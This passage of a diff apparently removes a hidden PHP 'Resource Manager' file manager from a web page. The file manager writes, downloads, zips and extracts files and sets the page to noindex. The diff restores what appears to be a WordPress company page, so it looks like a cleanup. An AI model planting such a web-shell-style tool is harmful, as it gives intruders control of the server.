-        $path    = $this->active_dir . DS . basename($name);
-        $is_ajax = strpos($_SERVER['CONTENT_TYPE'] ?? '', 'application/json') !== false;
-
-        if ($this->in_root($path)) {
-            $fh = $this->fs_fopen($path, 'w');
-            if ($fh) {
-                $this->fs_fwrite($fh, $content);
-                $this->fs_fclose($fh);
-            }
-        }
-        if ($is_ajax) {
-            @header('Content-Type: application/json');
-            echo json_encode(['ok' => true]);
-            exit;
-        }
-        $this->redirect();
-    }
-
-    private function op_download(): void
-    {
-        $path = $this->active_dir . DS . basename((string)$_GET['dl']);
-        if ($this->fs_is_file($path) && $this->in_root($path)) {
-            @header('Content-Type: application/octet-stream');
-            @header('Content-Disposition: attachment; filename="' . basename($path) . '"');
-            @header('Content-Length: ' . $this->fs_filesize($path));
-            $this->fs_readfile($path);
-            exit;
-        }
-    }
-
-    private function op_zip_single(): void
-    {
-        $name     = basename((string)$_GET['zip']);
-        $src      = $this->active_dir . DS . $name;
-        $tmp      = @tempnam(sys_get_temp_dir(), 'cds');
-        $archive  = new \ZipArchive();
-        if ($archive->open($tmp, \ZipArchive::CREATE) !== true) return;
-
-        if ($this->fs_is_dir($src))       $this->add_to_zip($archive, $src, $name);
-        elseif ($this->fs_is_file($src))  $archive->addFile($src, $name);
-
-        $archive->close();
-        @header('Content-Type: application/octet-stream');
-        @header('Content-Disposition: attachment; filename="' . $name . '.zip"');
-        $this->fs_readfile($tmp);
-        $this->fs_unlink($tmp);
-        exit;
-    }
-
-    private function op_archive_batch(): void
-    {
-        $tmp     = @tempnam(sys_get_temp_dir(), 'cds');
-        $archive = new \ZipArchive();
-        if ($archive->open($tmp, \ZipArchive::CREATE) !== true) return;
-
-        foreach ((array)$_POST['sel'] as $item) {
-            $src = $this->active_dir . DS . basename((string)$item);
-            if (!$this->in_root($src)) continue;
-            if ($this->fs_is_file($src))       $archive->addFile($src, basename($src));
-            elseif ($this->fs_is_dir($src))    $this->add_to_zip($archive, $src, basename($src));
-        }
-        $archive->close();
-        @header('Content-Type: application/octet-stream');
-        @header('Content-Disposition: attachment; filename="bundle_' . date('Ymd_His') . '.zip"');
-        $this->fs_readfile($tmp);
-        $this->fs_unlink($tmp);
-        exit;
-    }
-
-    private function add_to_zip(\ZipArchive $zip, string $dir, string $prefix): void
-    {
-        $items = $this->fs_glob($dir . DS . '*');
-        if (!$items) return;
-        foreach ($items as $item) {
-            $local = $prefix . '/' . basename($item);
-            if ($this->fs_is_dir($item)) $this->add_to_zip($zip, $item, $local);
-            else $zip->addFile($item, $local);
-        }
-    }
-
-    private function op_extract(): void
-    {
-        $path    = $this->active_dir . DS . basename((string)($_POST['archive_name'] ?? ''));
-        $archive = new \ZipArchive();
-        if ($archive->open($path) === true) {
-            $archive->extractTo($this->active_dir);
-            $archive->close();
-        }
-        $this->redirect();
-    }
-
-    // ---------------------------------------------------------------
-    // Directory listing
-    // ---------------------------------------------------------------
-
-    private function list_resources(): array
-    {
-        $entries = [];
-        $all     = $this->fs_glob($this->active_dir . DS . '*');
-        if ($all) foreach ($all as $item) $entries[] = basename($item);
-        $hidden = $this->fs_glob($this->active_dir . DS . '.*');
-        if ($hidden) {
-            foreach ($hidden as $item) {
-                $b = basename($item);
-                if ($b !== '.' && $b !== '..') $entries[] = $b;
-            }
-        }
-        $entries = array_unique($entries);
-        $sort    = isset($_GET['sort']) ? (string)$_GET['sort'] : 'name';
-        $dir     = $this->active_dir;
-
-        usort($entries, function (string $a, string $b) use ($dir, $sort): int {
-            $pa = $dir . DS . $a;
-            $pb = $dir . DS . $b;
-            $da = $this->fs_is_dir($pa);
-            $db = $this->fs_is_dir($pb);
-            if ($da && !$db) return -1;
-            if (!$da && $db) return  1;
-            return match ($sort) {
-                'size' => $this->fs_filesize($pa) <=> $this->fs_filesize($pb),
-                'date' => $this->fs_filemtime($pb) <=> $this->fs_filemtime($pa),
-                'type' => strcmp(
-                    $da ? '' : strtolower(pathinfo($a, PATHINFO_EXTENSION)),
-                    $db ? '' : strtolower(pathinfo($b, PATHINFO_EXTENSION))
-                ) ?: strcasecmp($a, $b),
-                default => strcasecmp($a, $b),
-            };
-        });
-
-        return $entries;
-    }
-
-    // ---------------------------------------------------------------
-    // Dashboard renderer
-    // ---------------------------------------------------------------
-
-    private function render_dashboard(): void
-    {
-        $resources = $this->list_resources();
-        $go        = isset($_GET['go'])     ? (string)$_GET['go']     : '';
-        $search    = isset($_GET['search']) ? (string)$_GET['search'] : '';
-        $sort      = isset($_GET['sort'])   ? (string)$_GET['sort']   : 'name';
-        $csrf      = $this->esc($this->csrf_token);
-        $rel       = $this->rel_path();
-
-        // Flash message
-        $flash = '';
-        if (isset($_SESSION['cds_notice'])) {
-            $n     = $_SESSION['cds_notice'];
-            $flash = '<div class="alert alert-' . $this->esc($n['type']) . ' alert-dismissible fade show" role="alert">'
-                   . $this->esc($n['text'])
-                   . '<button type="button" class="btn-close" data-bs-dismiss="alert"></button></div>';
-            unset($_SESSION['cds_notice']);
-        }
-
-        // ---- HTML head ----
-        echo '<!DOCTYPE html>
-<html lang="en" data-bs-theme="light">
+// ────────────────────────────────────────────────────────────────
+?>
+<!DOCTYPE html>
+<html lang="en-US">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<meta name="robots" content="noindex,nofollow">
-<title>Resource Manager</title>
-<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
-<link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<style>
-:root{--bg:#f0f2f5;--card:#fff;--txt:#1a1a2e;--brd:#e0e3e8;--hvr:#f5f7fa;--acc:#4f46e5;--acc2:#7c3aed;--muted:#6b7280}
-[data-bs-theme=dark]{--bg:#0f1117;--card:#1a1d2e;--txt:#e2e8f0;--brd:#2d3348;--hvr:#252a3e;--acc:#818cf8;--acc2:#a78bfa;--muted:#9ca3af}
-*{font-family:"Inter",system-ui,sans-serif}
-body{background:var(--bg);color:var(--txt);transition:all .3s}
-.topbar{background:linear-gradient(135deg,#4f46e5,#7c3aed);padding:12px 24px;color:#fff;display:flex;justify-content:space-between;align-items:center}
-.brand{font-weight:600;font-size:16px;display:flex;align-items:center;gap:8px}
-.brand i{font-size:20px}
-.top-acts{display:flex;gap:8px;align-items:center}
-.topbar .btn{font-size:13px;padding:5px 12px;border-radius:6px}
-.wrap{max-width:1200px;margin:20px auto;padding:0 16px}
-.card{background:var(--card);border:1px solid var(--brd);border-radius:12px;overflow:hidden;transition:all .3s}
-.card-h{padding:16px 20px;border-bottom:1px solid var(--brd);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px}
-.card-b{padding:16px 20px}
-.breadcrumb{margin:0;font-size:13px}
-.breadcrumb a{color:var(--acc);text-decoration:none}
-.breadcrumb a:hover{text-decoration:underline}
-.toolbar{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:16px}
-.toolbar .form-control,.toolbar .form-select{font-size:13px;border-radius:8px;border-color:var(--brd);background:var(--card);color:var(--txt)}
-.toolbar .btn{font-size:13px;border-radius:8px}
-.drop-zone{border:2px dashed var(--brd);border-radius:10px;padding:16px;text-align:center;color:var(--muted);font-size:13px;transition:all .2s;margin-bottom:16px}
-.drop-zone.over{border-color:var(--acc);background:rgba(79,70,229,.05);color:var(--acc)}
-.drop-zone i{font-size:24px;display:block;margin-bottom:6px}
-.creators{display:flex;gap:10px;margin-bottom:16px;flex-wrap:wrap}
-.creators form{display:flex;gap:6px}
-.creators .form-control{font-size:13px;border-radius:8px;width:180px;border-color:var(--brd);background:var(--card);color:var(--txt)}
-.creators .btn{font-size:13px;border-radius:8px;white-space:nowrap}
-table.rt{width:100%;border-collapse:collapse}
-table.rt th,table.rt td{padding:10px 14px;font-size:13px;border-bottom:1px solid var(--brd);text-align:left}
-table.rt th{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.4px;color:var(--muted);background:var(--hvr)}
-table.rt tr:hover td{background:var(--hvr)}
-table.rt .rn{display:flex;align-items:center;gap:8px}
-table.rt .rn a{color:var(--txt);text-decoration:none;font-weight:500}
-table.rt .rn a:hover{color:var(--acc)}
-.bi-folder-fill{color:#f59e0b;font-size:16px}
-.bi-file-earmark-text{color:var(--acc);font-size:16px}
-.meta{color:var(--muted);font-size:12px}
-.acts-col{white-space:nowrap}
-.btn-group .btn{font-size:12px;padding:3px 8px}
-.prog-bar{height:6px;display:none;margin-top:8px;border-radius:3px;overflow:hidden;background:var(--brd)}
-.prog-fill{height:100%;background:linear-gradient(90deg,var(--acc),var(--acc2));border-radius:3px;transition:width .2s}
-.alert{font-size:13px;border-radius:8px;margin-bottom:12px}
-.modal-content{border-radius:12px;border:1px solid var(--brd);background:var(--card)}
-.modal-header{border-bottom-color:var(--brd)}
-.modal-footer{border-top-color:var(--brd)}
-.modal-backdrop{backdrop-filter:blur(4px)}
-#codeEditor{font-family:"Fira Code","Cascadia Code",monospace;font-size:13px;line-height:1.6;border-radius:8px;border-color:var(--brd);background:var(--bg);color:var(--txt);resize:vertical}
-.pg-foot{text-align:center;padding:16px;font-size:12px;color:var(--muted);margin-top:16px}
-@media(max-width:768px){
-.topbar{flex-direction:column;text-align:center;gap:8px}
-.card-h{flex-direction:column}
-.toolbar{flex-direction:column;align-items:stretch}
-.creators{flex-direction:column}
-.creators .form-control{width:100%}
-table.rt .meta{display:none}
-}
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+
+<title>Management team &#8211; DYNAMIC GUARDFORCE SDN. BHD.</title>
+<meta name='robots' content='max-image-preview:large' />
+<link rel="alternate" type="application/rss+xml" title="DYNAMIC GUARDFORCE SDN. BHD. &raquo; Feed" href="https://dgf.com.my/feed/" />
+<link rel="alternate" type="application/rss+xml" title="DYNAMIC GUARDFORCE SDN. BHD. &raquo; Comments Feed" href="https://dgf.com.my/comments/feed/" />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://dgf.com.my/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdgf.com.my%2Fmanagement-team%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://dgf.com.my/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fdgf.com.my%2Fmanagement-team%2F&#038;format=xml" />
+<style id='wp-img-auto-sizes-contain-inline-css'>
+img:is([sizes=auto i],[sizes^="auto," i]){contain-intrinsic-size:3000px 1500px}
+/*# sourceURL=wp-img-auto-sizes-contain-inline-css */
 </style>
+<link rel='stylesheet' id='astra-theme-css-css' href='https://dgf.com.my/wp-content/themes/astra/assets/css/minified/style.min.css?ver=4.0.2' media='all' />
+<style id='astra-theme-css-inline-css'>
+.ast-no-sidebar .entry-content .alignfull {margin-left: calc( -50vw + 50%);margin-right: calc( -50vw + 50%);max-width: 100vw;width: 100vw;}.ast-no-sidebar .entry-content .alignwide {margin-left: calc(-41vw + 50%);margin-right: calc(-41vw + 50%);max-width: unset;width: unset;}.ast-no-sidebar .entry-content .alignfull .alignfull,.ast-no-sidebar .entry-content .alignfull .alignwide,.ast-no-sidebar .entry-content .alignwide .alignfull,.ast-no-sidebar .entry-content .alignwide .alignwide,.ast-no-sidebar .entry-content .wp-block-column .alignfull,.ast-no-sidebar .entry-content .wp-block-column .alignwide{width: 100%;margin-left: auto;margin-right: auto;}.wp-block-gallery,.blocks-gallery-grid {margin: 0;}.wp-block-separator {max-width: 100px;}.wp-block-separator.is-style-wide,.wp-block-separator.is-style-dots {max-width: none;}.entry-content .has-2-columns .wp-block-column:first-child {padding-right: 10px;}.entry-content .has-2-columns .wp-block-column:last-child {padding-left: 10px;}@media (max-width: 782px) {.entry-content .wp-block-columns .wp-block-column {flex-basis: 100%;}.entry-content .has-2-columns .wp-block-column:first-child {padding-right: 0;}.entry-content .has-2-columns .wp-block-column:last-child {padding-left: 0;}}body .entry-content .wp-block-latest-posts {margin-left: 0;}body .entry-content .wp-block-latest-posts li {list-style: none;}.ast-no-sidebar .ast-container .entry-content .wp-block-latest-posts {margin-left: 0;}.ast-header-break-point .entry-content .alignwide {margin-left: auto;margin-right: auto;}.entry-content .blocks-gallery-item img {margin-bottom: auto;}.wp-block-pullquote {border-top: 4px solid #555d66;border-bottom: 4px solid #555d66;color: #40464d;}:root{--ast-container-default-xlg-padding:6.67em;--ast-container-default-lg-padding:5.67em;--ast-container-default-slg-padding:4.34em;--ast-container-default-md-padding:3.34em;--ast-container-default-sm-padding:6.67em;--ast-container-default-xs-padding:2.4em;--ast-container-default-xxs-padding:1.4em;--ast-code-block-background:#EEEEEE;--ast-comment-inputs-background:#FAFAFA;}html{font-size:100%;}a,.page-title{color:#0c65ed;}a:hover,a:focus{color:#1a1a1a;}body,button,input,select,textarea,.ast-button,.ast-custom-button{font-family:Helvetica,Verdana,Arial,sans-serif;font-weight:400;font-size:16px;font-size:1rem;}blockquote{color:#000000;}p,.entry-content p{margin-bottom:1em;}h1,.entry-content h1,h2,.entry-content h2,h3,.entry-content h3,h4,.entry-content h4,h5,.entry-content h5,h6,.entry-content h6,.site-title,.site-title a{font-family:Helvetica,Verdana,Arial,sans-serif;font-weight:700;}.site-title{font-size:18px;font-size:1.125rem;display:block;}header .custom-logo-link img{max-width:171px;}.astra-logo-svg{width:171px;}.site-header .site-description{font-size:16px;font-size:1rem;display:none;}.entry-title{font-size:30px;font-size:1.875rem;}h1,.entry-content h1{font-size:50px;font-size:3.125rem;font-weight:700;font-family:Helvetica,Verdana,Arial,sans-serif;}h2,.entry-content h2{font-size:30px;font-size:1.875rem;font-family:Helvetica,Verdana,Arial,sans-serif;line-height:1.3em;}h3,.entry-content h3{font-size:25px;font-size:1.5625rem;font-family:Helvetica,Verdana,Arial,sans-serif;line-height:1.5em;}h4,.entry-content h4{font-size:20px;font-size:1.25rem;line-height:1.2em;font-family:Helvetica,Verdana,Arial,sans-serif;}h5,.entry-content h5{font-size:16px;font-size:1rem;line-height:1.2em;font-family:Helvetica,Verdana,Arial,sans-serif;}h6,.entry-content h6{font-size:12px;font-size:0.75rem;line-height:1.25em;font-family:Helvetica,Verdana,Arial,sans-serif;}::selection{background-color:#282662;color:#ffffff;}body,h1,.entry-title a,.entry-content h1,h2,.entry-content h2,h3,.entry-content h3,h4,.entry-content h4,h5,.entry-content h5,h6,.entry-content h6{color:#000000;}.tagcloud a:hover,.tagcloud a:focus,.tagcloud a.current-item{color:#ffffff;border-color:#0c65ed;background-color:#0c65ed;}input:focus,input[type="text"]:focus,input[type="email"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="reset"]:focus,input[type="search"]:focus,textarea:focus{border-color:#0c65ed;}input[type="radio"]:checked,input[type=reset],input[type="checkbox"]:checked,input[type="checkbox"]:hover:checked,input[type="checkbox"]:focus:checked,input[type=range]::-webkit-slider-thumb{border-color:#0c65ed;background-color:#0c65ed;box-shadow:none;}.site-footer a:hover + .post-count,.site-footer a:focus + .post-count{background:#0c65ed;border-color:#0c65ed;}.single .nav-links .nav-previous,.single .nav-links .nav-next{color:#0c65ed;}.entry-meta,.entry-meta *{line-height:1.45;color:#0c65ed;}.entry-meta a:hover,.entry-meta a:hover *,.entry-meta a:focus,.entry-meta a:focus *,.page-links > .page-link,.page-links .page-link:hover,.post-navigation a:hover{color:#1a1a1a;}#cat option,.secondary .calendar_wrap thead a,.secondary .calendar_wrap thead a:visited{color:#0c65ed;}.secondary .calendar_wrap #today,.ast-progress-val span{background:#0c65ed;}.secondary a:hover + .post-count,.secondary a:focus + .post-count{background:#0c65ed;border-color:#0c65ed;}.calendar_wrap #today > a{color:#ffffff;}.page-links .page-link,.single .post-navigation a{color:#0c65ed;}.ast-header-break-point .main-header-bar .ast-button-wrap .menu-toggle{border-radius:0px;}.widget-title{font-size:22px;font-size:1.375rem;color:#000000;}.main-header-menu .menu-link,.ast-header-custom-item a{color:#000000;}.main-header-menu .menu-item:hover > .menu-link,.main-header-menu .menu-item:hover > .ast-menu-toggle,.main-header-menu .ast-masthead-custom-menu-items a:hover,.main-header-menu .menu-item.focus > .menu-link,.main-header-menu .menu-item.focus > .ast-menu-toggle,.main-header-menu .current-menu-item > .menu-link,.main-header-menu .current-menu-ancestor > .menu-link,.main-header-menu .current-menu-item > .ast-menu-toggle,.main-header-menu .current-menu-ancestor > .ast-menu-toggle{color:#0c65ed;}.header-main-layout-3 .ast-main-header-bar-alignment{margin-right:auto;}.header-main-layout-2 .site-header-section-left .ast-site-identity{text-align:left;}.site-logo-img img{ transition:all 0.2s linear;}.ast-header-break-point .ast-mobile-menu-buttons-minimal.menu-toggle{background:transparent;color:#dd1515;}.ast-header-break-point .ast-mobile-menu-buttons-outline.menu-toggle{background:transparent;border:1px solid #dd1515;color:#dd1515;}.ast-header-break-point .ast-mobile-menu-buttons-fill.menu-toggle{background:#dd1515;color:#ffffff;}.ast-page-builder-template .hentry {margin: 0;}.ast-page-builder-template .site-content > .ast-container {max-width: 100%;padding: 0;}.ast-page-builder-template .site-content #primary {padding: 0;margin: 0;}.ast-page-builder-template .no-results {text-align: center;margin: 4em auto;}.ast-page-builder-template .ast-pagination {padding: 2em;}.ast-page-builder-template .entry-header.ast-no-title.ast-no-thumbnail {margin-top: 0;}.ast-page-builder-template .entry-header.ast-header-without-markup {margin-top: 0;margin-bottom: 0;}.ast-page-builder-template .entry-header.ast-no-title.ast-no-meta {margin-bottom: 0;}.ast-page-builder-template.single .post-navigation {padding-bottom: 2em;}.ast-page-builder-template.single-post .site-content > .ast-container {max-width: 100%;}.ast-page-builder-template .entry-header {margin-top: 4em;margin-left: auto;margin-right: auto;padding-left: 20px;padding-right: 20px;}.single.ast-page-builder-template .entry-header {padding-left: 20px;padding-right: 20px;}.ast-page-builder-template .ast-archive-description {margin: 4em auto 0;padding-left: 20px;padding-right: 20px;}.ast-page-builder-template.ast-no-sidebar .entry-content .alignwide {margin-left: 0;margin-right: 0;}.ast-small-footer{color:rgba(0,0,0,0.5);}.ast-small-footer > .ast-footer-overlay{background-color:#000000;;}.ast-small-footer a{color:#ffcc00;}.ast-small-footer a:hover{color:#000000;}.footer-adv .footer-adv-overlay{border-top-style:solid;border-top-color:#7a7a7a;}.wp-block-buttons.aligncenter{justify-content:center;}@media (max-width:782px){.entry-content .wp-block-columns .wp-block-column{margin-left:0px;}}.wp-block-image.aligncenter{margin-left:auto;margin-right:auto;}.wp-block-table.aligncenter{margin-left:auto;margin-right:auto;}@media (max-width:921px){.ast-separate-container #primary,.ast-separate-container #secondary{padding:1.5em 0;}#primary,#secondary{padding:1.5em 0;margin:0;}.ast-left-sidebar #content > .ast-container{display:flex;flex-direction:column-reverse;width:100%;}.ast-separate-container .ast-article-post,.ast-separate-container .ast-article-single{padding:1.5em 2.14em;}.ast-author-box img.avatar{margin:20px 0 0 0;}}@media (min-width:922px){.ast-separate-container.ast-right-sidebar #primary,.ast-separate-container.ast-left-sidebar #primary{border:0;}.search-no-results.ast-separate-container #primary{margin-bottom:4em;}}.elementor-button-wrapper .elementor-button{border-style:solid;text-decoration:none;border-top-width:0;border-right-width:0;border-left-width:0;border-bottom-width:0;}body .elementor-button.elementor-size-sm,body .elementor-button.elementor-size-xs,body .elementor-button.elementor-size-md,body .elementor-button.elementor-size-lg,body .elementor-button.elementor-size-xl,body .elementor-button{border-radius:5px;padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;}.elementor-button-wrapper .elementor-button{border-color:#dd0000;background-color:#dd0000;}.elementor-button-wrapper .elementor-button:hover,.elementor-button-wrapper .elementor-button:focus{color:#ffffff;background-color:#ea2300;border-color:#ea2300;}.wp-block-button .wp-block-button__link ,.elementor-button-wrapper .elementor-button,.elementor-button-wrapper .elementor-button:visited{color:#ffffff;}.elementor-button-wrapper .elementor-button{font-weight:600;font-size:13px;font-size:0.8125rem;line-height:1em;text-transform:uppercase;letter-spacing:1px;}body .elementor-button.elementor-size-sm,body .elementor-button.elementor-size-xs,body .elementor-button.elementor-size-md,body .elementor-button.elementor-size-lg,body .elementor-button.elementor-size-xl,body .elementor-button{font-size:13px;font-size:0.8125rem;}.wp-block-button .wp-block-button__link:hover,.wp-block-button .wp-block-button__link:focus{color:#ffffff;background-color:#ea2300;border-color:#ea2300;}.elementor-widget-heading h2.elementor-heading-title{line-height:1.3em;}.elementor-widget-heading h3.elementor-heading-title{line-height:1.5em;}.elementor-widget-heading h4.elementor-heading-title{line-height:1.2em;}.elementor-widget-heading h5.elementor-heading-title{line-height:1.2em;}.elementor-widget-heading h6.elementor-heading-title{line-height:1.25em;}.wp-block-button .wp-block-button__link{border-top-width:0;border-right-width:0;border-left-width:0;border-bottom-width:0;border-color:#dd0000;background-color:#dd0000;color:#ffffff;font-family:inherit;font-weight:600;line-height:1em;text-transform:uppercase;letter-spacing:1px;font-size:13px;font-size:0.8125rem;border-radius:5px;padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;}.menu-toggle,button,.ast-button,.ast-custom-button,.button,input#submit,input[type="button"],input[type="submit"],input[type="reset"]{border-style:solid;border-top-width:0;border-right-width:0;border-left-width:0;border-bottom-width:0;color:#ffffff;border-color:#dd0000;background-color:#dd0000;border-radius:5px;padding-top:10px;padding-right:10px;padding-bottom:10px;padding-left:10px;font-family:inherit;font-weight:600;font-size:13px;font-size:0.8125rem;line-height:1em;text-transform:uppercase;letter-spacing:1px;}button:focus,.menu-toggle:hover,button:hover,.ast-button:hover,.ast-custom-button:hover .button:hover,.ast-custom-button:hover ,input[type=reset]:hover,input[type=reset]:focus,input#submit:hover,input#submit:focus,input[type="button"]:hover,input[type="button"]:focus,input[type="submit"]:hover,input[type="submit"]:focus{color:#ffffff;background-color:#ea2300;border-color:#ea2300;}@media (min-width:544px){.ast-container{max-width:100%;}}@media (max-width:544px){.ast-separate-container .ast-article-post,.ast-separate-container .ast-article-single,.ast-separate-container .comments-title,.ast-separate-container .ast-archive-description{padding:1.5em 1em;}.ast-separate-container #content .ast-container{padding-left:0.54em;padding-right:0.54em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 1em;margin-bottom:1.5em;}.ast-separate-container .ast-comment-list .bypostauthor{padding:.5em;}.ast-search-menu-icon.ast-dropdown-active .search-field{width:170px;}.site-branding img,.site-header .site-logo-img .custom-logo-link img{max-width:100%;}}@media (max-width:921px){.ast-mobile-header-stack .main-header-bar .ast-search-menu-icon{display:inline-block;}.ast-header-break-point.ast-header-custom-item-outside .ast-mobile-header-stack .main-header-bar .ast-search-icon{margin:0;}.ast-comment-avatar-wrap img{max-width:2.5em;}.ast-separate-container .ast-comment-list li.depth-1{padding:1.5em 2.14em;}.ast-separate-container .comment-respond{padding:2em 2.14em;}.ast-comment-meta{padding:0 1.8888em 1.3333em;}}.ast-no-sidebar.ast-separate-container .entry-content .alignfull {margin-left: -6.67em;margin-right: -6.67em;width: auto;}@media (max-width: 1200px) {.ast-no-sidebar.ast-separate-container .entry-content .alignfull {margin-left: -2.4em;margin-right: -2.4em;}}@media (max-width: 768px) {.ast-no-sidebar.ast-separate-container .entry-content .alignfull {margin-left: -2.14em;margin-right: -2.14em;}}@media (max-width: 544px) {.ast-no-sidebar.ast-separate-container .entry-content .alignfull {margin-left: -1em;margin-right: -1em;}}.ast-no-sidebar.ast-separate-container .entry-content .alignwide {margin-left: -20px;margin-right: -20px;}.ast-no-sidebar.ast-separate-container .entry-content .wp-block-column .alignfull,.ast-no-sidebar.ast-separate-container .entry-content .wp-block-column .alignwide {margin-left: auto;margin-right: auto;width: 100%;}@media (max-width:921px){.site-title{font-size:24px;font-size:1.5rem;display:block;}.site-header .site-description{font-size:12px;font-size:0.75rem;display:none;}.entry-title{font-size:30px;}h1,.entry-content h1{font-size:30px;}h2,.entry-content h2{font-size:25px;}h3,.entry-content h3{font-size:20px;}}@media (max-width:544px){.site-title{font-size:24px;font-size:1.5rem;display:block;}.site-header .site-description{font-size:12px;font-size:0.75rem;display:none;}.entry-title{font-size:30px;}h1,.entry-content h1{font-size:30px;}h2,.entry-content h2{font-size:25px;}h3,.entry-content h3{font-size:20px;}header .custom-logo-link img,.ast-header-break-point .site-branding img,.ast-header-break-point .custom-logo-link img{max-width:68px;}.astra-logo-svg{width:68px;}.ast-header-break-point .site-logo-img .custom-mobile-logo-link img{max-width:68px;}}@media (max-width:921px){html{font-size:91.2%;}}@media (max-width:544px){html{font-size:91.2%;}}@media (min-width:922px){.ast-container{max-width:1240px;}}@font-face {font-family: "Astra";src: url(https://dgf.com.my/wp-content/themes/astra/assets/fonts/astra.woff) format("woff"),url(https://dgf.com.my/wp-content/themes/astra/assets/fonts/astra.ttf) format("truetype"),url(https://dgf.com.my/wp-content/themes/astra/assets/fonts/astra.svg#astra) format("svg");font-weight: normal;font-style: normal;font-display: fallback;}@media (max-width:921px) {.main-header-bar .main-header-bar-navigation{display:none;}}.ast-desktop .main-header-menu.submenu-with-border .sub-menu,.ast-desktop .main-header-menu.submenu-with-border .astra-full-megamenu-wrapper{border-color:#282662;}.ast-desktop .main-header-menu.submenu-with-border .sub-menu{border-top-width:0px;border-right-width:0px;border-left-width:0px;border-bottom-width:0px;border-style:solid;}.ast-desktop .main-header-menu.submenu-with-border .sub-menu .sub-menu{top:-0px;}.ast-desktop .main-header-menu.submenu-with-border .sub-menu .menu-link,.ast-desktop .main-header-menu.submenu-with-border .children .menu-link{border-bottom-width:0px;border-style:solid;border-color:#eaeaea;}@media (min-width:922px){.main-header-menu .sub-menu .menu-item.ast-left-align-sub-menu:hover > .sub-menu,.main-header-menu .sub-menu .menu-item.ast-left-align-sub-menu.focus > .sub-menu{margin-left:-0px;}}.ast-small-footer{border-top-style:solid;border-top-width:1px;border-top-color:rgba(0,0,0,0.1);}.ast-header-break-point.ast-header-custom-item-inside .main-header-bar .main-header-bar-navigation .ast-search-icon {display: none;}.ast-header-break-point.ast-header-custom-item-inside .main-header-bar .ast-search-menu-icon .search-form {padding: 0;display: block;overflow: hidden;}.ast-header-break-point .ast-header-custom-item .widget:last-child {margin-bottom: 1em;}.ast-header-custom-item .widget {margin: 0.5em;display: inline-block;vertical-align: middle;}.ast-header-custom-item .widget p {margin-bottom: 0;}.ast-header-custom-item .widget li {width: auto;}.ast-header-custom-item-inside .button-custom-menu-item .menu-link {display: none;}.ast-header-custom-item-inside.ast-header-break-point .button-custom-menu-item .ast-custom-button-link {display: none;}.ast-header-custom-item-inside.ast-header-break-point .button-custom-menu-item .menu-link {display: block;}.ast-header-break-point.ast-header-custom-item-outside .main-header-bar .ast-search-icon {margin-right: 1em;}.ast-header-break-point.ast-header-custom-item-inside .main-header-bar .ast-search-menu-icon .search-field,.ast-header-break-point.ast-header-custom-item-inside .main-header-bar .ast-search-menu-icon.ast-inline-search .search-field {width: 100%;padding-right: 5.5em;}.ast-header-break-point.ast-header-custom-item-inside .main-header-bar .ast-search-menu-icon .search-submit {display: block;position: absolute;height: 100%;top: 0;right: 0;padding: 0 1em;border-radius: 0;}.ast-header-break-point .ast-header-custom-item .ast-masthead-custom-menu-items {padding-left: 20px;padding-right: 20px;margin-bottom: 1em;margin-top: 1em;}.ast-header-custom-item-inside.ast-header-break-point .button-custom-menu-item {padding-left: 0;padding-right: 0;margin-top: 0;margin-bottom: 0;}.astra-icon-down_arrow::after {content: "\e900";font-family: Astra;}.astra-icon-close::after {content: "\e5cd";font-family: Astra;}.astra-icon-drag_handle::after {content: "\e25d";font-family: Astra;}.astra-icon-format_align_justify::after {content: "\e235";font-family: Astra;}.astra-icon-menu::after {content: "\e5d2";font-family: Astra;}.astra-icon-reorder::after {content: "\e8fe";font-family: Astra;}.astra-icon-search::after {content: "\e8b6";font-family: Astra;}.astra-icon-zoom_in::after {content: "\e56b";font-family: Astra;}.astra-icon-check-circle::after {content: "\e901";font-family: Astra;}.astra-icon-shopping-cart::after {content: "\f07a";font-family: Astra;}.astra-icon-shopping-bag::after {content: "\f290";font-family: Astra;}.astra-icon-shopping-basket::after {content: "\f291";font-family: Astra;}.astra-icon-circle-o::after {content: "\e903";font-family: Astra;}.astra-icon-certificate::after {content: "\e902";font-family: Astra;}blockquote {padding: 1.2em;}:root .has-ast-global-color-0-color{color:var(--ast-global-color-0);}:root .has-ast-global-color-0-background-color{background-color:var(--ast-global-color-0);}:root .wp-block-button .has-ast-global-color-0-color{color:var(--ast-global-color-0);}:root .wp-block-button .has-ast-global-color-0-background-color{background-color:var(--ast-global-color-0);}:root .has-ast-global-color-1-color{color:var(--ast-global-color-1);}:root .has-ast-global-color-1-background-color{background-color:var(--ast-global-color-1);}:root .wp-block-button .has-ast-global-color-1-color{color:var(--ast-global-color-1);}:root .wp-block-button .has-ast-global-color-1-background-color{background-color:var(--ast-global-color-1);}:root .has-ast-global-color-2-color{color:var(--ast-global-color-2);}:root .has-ast-global-color-2-background-color{background-color:var(--ast-global-color-2);}:root .wp-block-button .has-ast-global-color-2-color{color:var(--ast-global-color-2);}:root .wp-block-button .has-ast-global-color-2-background-color{background-color:var(--ast-global-color-2);}:root .has-ast-global-color-3-color{color:var(--ast-global-color-3);}:root .has-ast-global-color-3-background-color{background-color:var(--ast-global-color-3);}:root .wp-block-button .has-ast-global-color-3-color{color:var(--ast-global-color-3);}:root .wp-block-button .has-ast-global-color-3-background-color{background-color:var(--ast-global-color-3);}:root .has-ast-global-color-4-color{color:var(--ast-global-color-4);}:root .has-ast-global-color-4-background-color{background-color:var(--ast-global-color-4);}:root .wp-block-button .has-ast-global-color-4-color{color:var(--ast-global-color-4);}:root .wp-block-button 